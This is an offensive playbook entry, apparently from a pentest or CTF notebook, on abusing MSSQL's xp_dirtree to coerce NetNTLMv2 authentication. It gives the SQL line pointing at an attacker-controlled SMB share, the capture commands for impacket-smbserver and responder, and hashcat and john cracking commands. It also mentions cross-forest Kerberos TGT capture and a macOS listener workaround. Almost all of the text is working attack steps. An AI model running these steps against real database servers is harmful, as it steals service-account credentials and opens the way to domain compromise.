# `xp_dirtree` — NTLM Coercion via Public Role

## When this applies

- ANY MSSQL login (including a low-priv user from a leaked PDF or guest SMB share) — `xp_dirtree` is granted to `public` role by default.
- Goal: coerce the SQL service account to NetNTLMv2-authenticate to your fake share, capture the hash, crack offline.

## Technique

`EXEC master..xp_dirtree '\\<attacker_IP>\share';` makes the SQL service account NetNTLMv2-authenticate to your SMB server. No `EXECUTE AS LOGIN`, no impersonation, no sysadmin needed. The captured hash is the SQL service-account NetNTLMv2 — usually a domain user with WinRM/SMB rights once cracked.

## Steps

```sql
-- From any MSSQL login (public role is enough):
EXEC master..xp_dirtree '\\<attacker_IP>\share';
```

Capture with `impacket-smbserver -smb2support share /tmp/share` (on macOS, see SMB capture gotcha below) or `responder -I tun0`. Crack offline with `hashcat -m 5600` / `john --format=netntlmv2`. The recovered cleartext is the SQL service-account password — usually a domain user with WinRM/SMB rights.

## Cross-Forest Coercion

If linked server crosses a forest trust, `EXEC xp_dirtree '\\target\share'` triggers Kerberos auth → unconstrained delegation TGT capture on the receiving DC.

## `impacket-smbserver` on macOS Sequoia/Sonoma

`-ip <specific>` silently fails to bind 445 (listener appears running but connections are refused). Workaround: omit `-ip` so the server binds wildcard `0.0.0.0:445`. Linux is unaffected.

```bash
sudo impacket-smbserver share /tmp/share -smb2support       # works on macOS
sudo impacket-smbserver -ip <VPN_IP> share /tmp/share        # FAILS on macOS
```

## Verifying success

- The SMB server logs the NetNTLMv2 hash for the SQL service account.
- `hashcat -m 5600 hash.txt rockyou.txt` cracks to a usable password.

## Common pitfalls

- macOS `-ip <specific>` flag silently breaks port-445 binding — omit it.
- The captured hash is the SQL service account, not necessarily a domain admin — cracking is still required.

## Tools

- impacket `mssqlclient.py`, `smbserver.py`
- responder
- hashcat (`-m 5600`)
- john (`--format=netntlmv2`)
